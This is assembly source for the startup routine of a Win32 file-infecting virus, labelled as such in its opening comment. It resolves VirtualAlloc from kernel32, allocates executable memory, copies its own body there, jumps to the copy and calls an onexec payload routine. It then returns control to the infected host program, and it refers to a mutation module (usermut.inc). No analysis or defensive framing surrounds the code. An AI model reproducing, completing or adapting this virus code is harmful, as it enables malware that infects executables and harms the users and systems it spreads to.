
; virus startup code
; calls onexec() subroutine

MEM_COMMIT              equ     00001000h
MEM_RESERVE             equ     00002000h
PAGE_EXECUTE_READWRITE  equ     00000040h

init:
                        pusha

                        ; ebp<--@start   ***FIXED OPCODE***  see usermut.inc
                        mov     ebp, 12345678h

                        seh_init

                        call    get_kernel_export_base
                        mov_h   edi, VirtualAlloc
                        call    findfunc
                        jz      __error

                        push    PAGE_EXECUTE_READWRITE
                        push    MEM_RESERVE+MEM_COMMIT
                        push    DATASIZE+DATA_RVA
                        push    offset start-DATA_RVA
                        call    eax
                        or      eax, eax
                        jz      __error

                        mov     esi, ebp
                        lea     edi, start
                        mov     ecx, CODESIZE
                        cld
                        rep     movsb

                        pusho   __newloc
                        pop     eax
                        sub     eax, ebp
                        add     eax, offset start
                        jmp     eax
__newloc:

                        call    init_win32api
                        jz      __error

                        call    init_memory
                        call    randomize

                        call    onexec

__error:                seh_done

                        call    get_old_eip     ; back to host
                        mov     [esp+7*4], eax
                        popa
                        jmp     eax

get_old_eip:            push    12345678h   ; ** FIXED opcodes
                        pop     eax         ; ** do not change
                        ret                 ; ** used in usermut.inc

init_memory:            push    CODESIZE
                        push    0
                        call    xxGlobalAlloc
                        mov     buf_ptr, eax

                        push    MAXMEM
                        push    0
                        call    xxGlobalAlloc
                        mov     mem_ptr, eax

                        ret
